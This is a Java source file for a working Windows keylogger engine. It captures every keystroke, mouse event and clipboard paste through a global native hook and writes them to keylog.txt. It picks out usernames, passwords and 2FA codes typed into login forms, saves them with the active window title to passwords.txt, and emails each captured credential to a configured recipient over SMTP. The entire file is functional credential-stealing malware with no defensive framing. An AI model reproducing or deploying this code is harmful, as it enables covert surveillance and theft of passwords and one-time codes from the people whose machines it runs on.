package keylogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseEvent;
import com.github.kwhat.jnativehook.mouse.NativeMouseInputListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseWheelEvent;
import com.github.kwhat.jnativehook.mouse.NativeMouseWheelListener;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import javax.mail.*;
import javax.mail.internet.*;
import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Pattern;

/**
 * Core keylogger engine.
 *
 * Part 1 – Logs every keystroke and mouse event to keylog.txt.
 * Part 2 – Detects credential sequences; writes them to passwords.txt
 *           and optionally sends an email alert.
 *
 * Detection scenarios:
 *   A. username [TAB] password [ENTER]    -> TYPED
 *   B. anything [ENTER]                   -> TYPED
 *   C. Ctrl+V then [ENTER]                -> CLIPBOARD_PASTE
 *   D. 4-8 digit numeric code [ENTER]     -> 2FA_CODE
 */
public class CoreLogger
        implements NativeKeyListener, NativeMouseInputListener, NativeMouseWheelListener {

    // ── Output files ─────────────────────────────────────────────────────────
    public static final String LOG_FILE  = "keylog.txt";
    public static final String PASS_FILE = "passwords.txt";

    private static final SimpleDateFormat TS_FMT =
            new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

    private static final Pattern OTP_PATTERN = Pattern.compile("\\d{4,8}");

    // NativeInputEvent modifier bitmasks (stable across JNativeHook versions)
    // CTRL_L_MASK = 0x04, CTRL_R_MASK = 0x08
    private static final int CTRL_ANY = 0x0C;

    // ── State ─────────────────────────────────────────────────────────────────
    private volatile boolean running        = false;
    private volatile boolean hookRegistered = false;

    private final List<String> buffer    = new ArrayList<String>();
    private final List<String> preTabBuf = new ArrayList<String>();
    private boolean tabSeen     = false;
    private boolean ctrlHeld    = false;
    private String  clipAtPaste = null;
    private volatile String uiaUsername = null; // set by FocusTracker

    // Mouse-move throttle
    private long lastMoveMs = 0;
    private static final long MOVE_GAP_MS = 2000;

    // ── Callbacks ─────────────────────────────────────────────────────────────
    private final LogCallback        onLog;
    private final CredentialCallback onCredential;

    public interface LogCallback        { void call(String text); }
    public interface CredentialCallback { void call(CredentialEntry entry); }

    // ── Email config ──────────────────────────────────────────────────────────
    volatile EmailConfig emailConfig = new EmailConfig();

    // ── Constructor ───────────────────────────────────────────────────────────

    private final FocusTracker focusTracker;

    public CoreLogger(LogCallback onLog, CredentialCallback onCredential) {
        this.onLog        = onLog;
        this.onCredential = onCredential;
        this.focusTracker = new FocusTracker(new FocusTracker.FieldLeftCallback() {
            @Override public void onFieldLeft(String value) { uiaUsername = value; }
        });
    }

    // ── Start / Stop ──────────────────────────────────────────────────────────

    public void start() throws NativeHookException {
        if (running) return;

        if (!hookRegistered) {
            Logger jnh = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            jnh.setLevel(Level.OFF);
            jnh.setUseParentHandlers(false);
            GlobalScreen.registerNativeHook();
            hookRegistered = true;
        }

        GlobalScreen.addNativeKeyListener(this);
        GlobalScreen.addNativeMouseListener(this);
        GlobalScreen.addNativeMouseMotionListener(this);
        GlobalScreen.addNativeMouseWheelListener(this);

        running = true;
        focusTracker.start();
        writeLog("\n" + repeat('=', 60) + "\n[SESSION START]  " + now()
                + "\n" + repeat('=', 60) + "\n");
    }

    public void stop() {
        if (!running) return;
        running = false;
        focusTracker.stop();
        writeLog("\n[SESSION END]  " + now() + "\n" + repeat('=', 60) + "\n");
        GlobalScreen.removeNativeKeyListener(this);
        GlobalScreen.removeNativeMouseListener(this);
        GlobalScreen.removeNativeMouseMotionListener(this);
        GlobalScreen.removeNativeMouseWheelListener(this);
        // Hook stays registered so restart works reliably — shutdown() cleans it up
    }

    /** Call on application exit to fully unregister the native hook. */
    public void shutdown() {
        stop();
        if (hookRegistered) {
            try { GlobalScreen.unregisterNativeHook(); } catch (NativeHookException ignored) {}
            hookRegistered = false;
        }
    }

    public boolean isRunning() { return running; }

    // ── Keyboard ──────────────────────────────────────────────────────────────

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        if (!running) return;

        // Derive ctrl state from the modifier mask — no VC_CONTROL_L/R needed
        ctrlHeld = (e.getModifiers() & CTRL_ANY) != 0;

        if (ctrlHeld) handleCtrlCombo(e);

        String display = keyToDisplay(e);
        if (display != null) {
            writeLog(display);
            feedSpecialKey(e);
        }
        // Printable chars are handled in nativeKeyTyped (correct shifted char)
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        ctrlHeld = (e.getModifiers() & CTRL_ANY) != 0;
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        if (!running) return;
        char ch = e.getKeyChar();
        if (ch != NativeKeyEvent.CHAR_UNDEFINED && ch >= 32 && ch != 127) {
            String s = String.valueOf(ch);
            writeLog(s);
            if (!ctrlHeld) buffer.add(s);
        }
    }

    /**
     * Returns a display tag for non-printable / special keys.
     * Returns null for regular printable characters (handled by nativeKeyTyped).
     * Uses key text for modifier keys so no L/R variant constants are needed.
     */
    private String keyToDisplay(NativeKeyEvent e) {
        int    code = e.getKeyCode();
        String text = NativeKeyEvent.getKeyText(code);

        // Navigation & editing keys
        if (code == NativeKeyEvent.VC_ENTER)       return "[ENTER]\n";
        if (code == NativeKeyEvent.VC_TAB)          return "[TAB]";
        if (code == NativeKeyEvent.VC_BACKSPACE)    return "[BKSP]";
        if (code == NativeKeyEvent.VC_DELETE)       return "[DEL]";
        if (code == NativeKeyEvent.VC_ESCAPE)       return "[ESC]";
        if (code == NativeKeyEvent.VC_UP)           return "[UP]";
        if (code == NativeKeyEvent.VC_DOWN)         return "[DOWN]";
        if (code == NativeKeyEvent.VC_LEFT)         return "[LEFT]";
        if (code == NativeKeyEvent.VC_RIGHT)        return "[RIGHT]";
        if (code == NativeKeyEvent.VC_HOME)         return "[HOME]";
        if (code == NativeKeyEvent.VC_END)          return "[END]";
        if (code == NativeKeyEvent.VC_PAGE_UP)      return "[PGUP]";
        if (code == NativeKeyEvent.VC_PAGE_DOWN)    return "[PGDN]";
        if (code == NativeKeyEvent.VC_INSERT)       return "[INS]";
        if (code == NativeKeyEvent.VC_PRINTSCREEN)  return "[PRTSC]";
        if (code == NativeKeyEvent.VC_F1)           return "[F1]";
        if (code == NativeKeyEvent.VC_F2)           return "[F2]";
        if (code == NativeKeyEvent.VC_F3)           return "[F3]";
        if (code == NativeKeyEvent.VC_F4)           return "[F4]";
        if (code == NativeKeyEvent.VC_F5)           return "[F5]";
        if (code == NativeKeyEvent.VC_F6)           return "[F6]";
        if (code == NativeKeyEvent.VC_F7)           return "[F7]";
        if (code == NativeKeyEvent.VC_F8)           return "[F8]";
        if (code == NativeKeyEvent.VC_F9)           return "[F9]";
        if (code == NativeKeyEvent.VC_F10)          return "[F10]";
        if (code == NativeKeyEvent.VC_F11)          return "[F11]";
        if (code == NativeKeyEvent.VC_F12)          return "[F12]";

        // Modifier keys — identified by key text, no L/R constants required
        if (text.contains("Shift"))                 return "[SHIFT]";
        if (text.contains("Control") || text.contains("Ctrl")) return "[CTRL]";
        if (text.contains("Alt"))                   return "[ALT]";
        if (text.contains("Meta") || text.contains("Windows") || text.contains("Win"))
                                                    return "[WIN]";
        if (text.contains("Caps"))                  return "[CAPS]";
        if (text.contains("Num Lock"))              return "[NUMLOCK]";

        // Printable character — let nativeKeyTyped handle it
        return null;
    }

    // ── Credential detection ──────────────────────────────────────────────────

    private void handleCtrlCombo(NativeKeyEvent e) {
        String text = NativeKeyEvent.getKeyText(e.getKeyCode());
        if ("V".equalsIgnoreCase(text)) {
            String clip = readClipboard();
            if (clip != null && !clip.trim().isEmpty()) {
                clipAtPaste = clip;
                buffer.add(" PASTE " + clip);
                writeLog("[PASTE:\"" + clip.replace("\n", "\\n") + "\"]");
            }
        }
    }

    private void feedSpecialKey(NativeKeyEvent e) {
        int    code = e.getKeyCode();
        String text = NativeKeyEvent.getKeyText(code).toLowerCase();

        // Use both the numeric constant AND the key-text name as a fallback,
        // because VC_TAB / VC_ENTER values can vary across JNativeHook builds.
        boolean isEnter = code == NativeKeyEvent.VC_ENTER
                || text.equals("enter") || text.equals("return");
        boolean isTab   = code == NativeKeyEvent.VC_TAB
                || text.equals("tab");
        boolean isBksp  = code == NativeKeyEvent.VC_BACKSPACE
                || text.equals("backspace");

        if (isEnter) {
            analyseAndEmit();
            resetState();
        } else if (isTab) {
            preTabBuf.clear();
            preTabBuf.addAll(buffer);
            buffer.clear();
            tabSeen = true;
        } else if (isBksp) {
            if (!buffer.isEmpty()) buffer.remove(buffer.size() - 1);
        }
    }

    private void resetState() {
        buffer.clear();
        preTabBuf.clear();
        tabSeen     = false;
        clipAtPaste = null;
        uiaUsername = null;
    }

    private String tokensToString(List<String> tokens) {
        StringBuilder sb = new StringBuilder();
        for (String t : tokens) {
            if (t.startsWith(" PASTE "))
                sb.append(t.substring(" PASTE ".length()));
            else
                sb.append(t);
        }
        return sb.toString();
    }

    private void analyseAndEmit() {
        String password = tokensToString(buffer).trim();
        String username = tabSeen ? tokensToString(preTabBuf).trim() : null;
        if (username == null || username.isEmpty()) username = uiaUsername;

        if (password.isEmpty() && clipAtPaste != null)
            password = clipAtPaste;
        if (password.isEmpty()) return;

        boolean hasPaste = false;
        for (String t : buffer) {
            if (t.startsWith(" PASTE ")) { hasPaste = true; break; }
        }
        boolean is2FA = OTP_PATTERN.matcher(password).matches();

        String type = is2FA    ? "2FA_CODE"
                    : hasPaste ? "CLIPBOARD_PASTE"
                               : "TYPED";

        CredentialEntry entry = new CredentialEntry(
                now(), getActiveWindow(), username, password, type);

        writePasswordFile(entry);
        if (onCredential != null) onCredential.call(entry);
        sendEmail(entry);
    }

    // ── Mouse ─────────────────────────────────────────────────────────────────

    @Override
    public void nativeMousePressed(NativeMouseEvent e) {
        if (!running) return;
        writeLog(String.format("[CLICK btn%d (%d,%d)] ",
                e.getButton(), e.getX(), e.getY()));
        if (!buffer.isEmpty()) {
            preTabBuf.clear();
            preTabBuf.addAll(buffer);
            buffer.clear();
            tabSeen = true;
        }
    }

    @Override
    public void nativeMouseReleased(NativeMouseEvent e) {}

    @Override
    public void nativeMouseMoved(NativeMouseEvent e) {
        if (!running) return;
        long now = System.currentTimeMillis();
        if (now - lastMoveMs >= MOVE_GAP_MS) {
            lastMoveMs = now;
            writeLog(String.format("[MOVE (%d,%d)] ", e.getX(), e.getY()));
        }
    }

    @Override
    public void nativeMouseDragged(NativeMouseEvent e) { nativeMouseMoved(e); }

    @Override
    public void nativeMouseWheelMoved(NativeMouseWheelEvent e) {
        if (!running) return;
        String dir = e.getWheelRotation() < 0 ? "UP" : "DOWN";
        writeLog(String.format("[SCROLL %s (%d,%d)] ", dir, e.getX(), e.getY()));
    }

    @Override public void nativeMouseClicked(NativeMouseEvent e) {}

    // ── File I/O ──────────────────────────────────────────────────────────────

    private synchronized void writeLog(String text) {
        try {
            FileOutputStream fos = new FileOutputStream(LOG_FILE, true);
            OutputStreamWriter w = new OutputStreamWriter(fos, StandardCharsets.UTF_8);
            w.write(text);
            w.close();
            fos.close();
        } catch (IOException ignored) {}
        if (onLog != null) onLog.call(text);
    }

    private synchronized void writePasswordFile(CredentialEntry e) {
        try {
            FileOutputStream fos = new FileOutputStream(PASS_FILE, true);
            OutputStreamWriter w = new OutputStreamWriter(fos, StandardCharsets.UTF_8);
            w.write("\n" + repeat('-', 50) + "\n");
            w.write("[" + e.getTimestamp() + "]  TYPE: " + e.getType() + "\n");
            w.write("Window   : " + e.getWindow() + "\n");
            if (e.getUsername() != null && !e.getUsername().trim().isEmpty())
                w.write("Username : " + e.getUsername() + "\n");
            w.write("Password : " + e.getPassword() + "\n");
            w.close();
            fos.close();
        } catch (IOException ignored) {}
    }

    // ── Email ─────────────────────────────────────────────────────────────────

    private void sendEmail(final CredentialEntry entry) {
        final EmailConfig cfg = emailConfig;
        if (!cfg.isEnabled()
                || cfg.getSender().trim().isEmpty()
                || cfg.getAppPassword().trim().isEmpty()
                || cfg.getRecipient().trim().isEmpty()) return;

        Thread t = new Thread(new Runnable() {
            @Override public void run() {
                try {
                    Properties props = new Properties();
                    props.put("mail.smtp.host",            cfg.getSmtpServer());
                    props.put("mail.smtp.port",            String.valueOf(cfg.getSmtpPort()));
                    props.put("mail.smtp.auth",            "true");
                    props.put("mail.smtp.starttls.enable", "true");

                    final String user = cfg.getSender();
                    final String pass = cfg.getAppPassword();

                    Session session = Session.getInstance(props, new Authenticator() {
                        @Override protected PasswordAuthentication getPasswordAuthentication() {
                            return new PasswordAuthentication(user, pass);
                        }
                    });

                    String subject = "[KeyLogger] " + entry.getType() + " -- "
                            + entry.getWindow().substring(0,
                                Math.min(50, entry.getWindow().length()));

                    StringBuilder body = new StringBuilder();
                    body.append("KeyLogger Alert\n").append(repeat('=', 40)).append("\n");
                    body.append("Time     : ").append(entry.getTimestamp()).append("\n");
                    body.append("Type     : ").append(entry.getType()).append("\n");
                    body.append("Window   : ").append(entry.getWindow()).append("\n");
                    if (entry.getUsername() != null
                            && !entry.getUsername().trim().isEmpty())
                        body.append("Username : ").append(entry.getUsername()).append("\n");
                    body.append("Password : ").append(entry.getPassword()).append("\n");

                    Message msg = new MimeMessage(session);
                    msg.setFrom(new InternetAddress(cfg.getSender()));
                    msg.setRecipients(Message.RecipientType.TO,
                            InternetAddress.parse(cfg.getRecipient()));
                    msg.setSubject(subject);
                    msg.setText(body.toString());
                    Transport.send(msg);

                } catch (MessagingException ex) {
                    writeLog("\n[EMAIL ERROR: " + ex.getMessage() + "]\n");
                }
            }
        });
        t.setDaemon(true);
        t.start();
    }

    // ── Utilities ─────────────────────────────────────────────────────────────

    private static String now() {
        return TS_FMT.format(new Date());
    }

    private static String getActiveWindow() {
        try {
            WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();
            char[] buf = new char[512];
            User32.INSTANCE.GetWindowText(hwnd, buf, buf.length);
            String title = Native.toString(buf).trim();
            return title.isEmpty() ? "Unknown" : title;
        } catch (Exception e) {
            return "Unknown";
        }
    }

    private static String readClipboard() {
        try {
            return (String) Toolkit.getDefaultToolkit()
                    .getSystemClipboard()
                    .getData(DataFlavor.stringFlavor);
        } catch (Exception e) {
            return null;
        }
    }

    private static String repeat(char c, int n) {
        StringBuilder sb = new StringBuilder(n);
        for (int i = 0; i < n; i++) sb.append(c);
        return sb.toString();
    }
}
